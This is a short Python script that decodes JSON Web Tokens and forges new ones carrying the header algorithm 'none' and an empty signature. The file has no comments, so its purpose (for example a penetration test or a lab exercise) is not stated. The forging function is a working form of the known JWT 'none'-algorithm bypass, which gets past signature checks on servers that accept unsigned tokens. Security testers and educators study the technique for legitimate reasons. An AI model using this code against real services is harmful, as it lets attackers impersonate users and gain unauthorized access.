import base64
import json
from typing import Any, Dict


def decode_jwt(token: str) -> Dict[str, Any]:
    parts = token.split('.')
    if len(parts) < 2:
        raise ValueError(f"Invalid JWT format: expected at least 2 parts, got {len(parts)}")

    header_b64 = parts[0]
    payload_b64 = parts[1] if len(parts) > 1 else ''

    def decode_part(b64_str: str) -> str:
        b64_str = b64_str.replace('-', '+').replace('_', '/')
        padding = 4 - len(b64_str) % 4
        if padding != 4:
            b64_str += '=' * padding
        return base64.b64decode(b64_str).decode()

    header = json.loads(decode_part(header_b64))
    payload = json.loads(decode_part(payload_b64))

    return {
        'header': header,
        'payload': payload,
        'original_token': token
    }


def forge_none_algorithm(token_data: Dict[str, Any]) -> str:
    header = {'typ': 'JWT', 'alg': 'none'}
    payload = token_data['payload']

    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

    return f"{header_b64}.{payload_b64}."
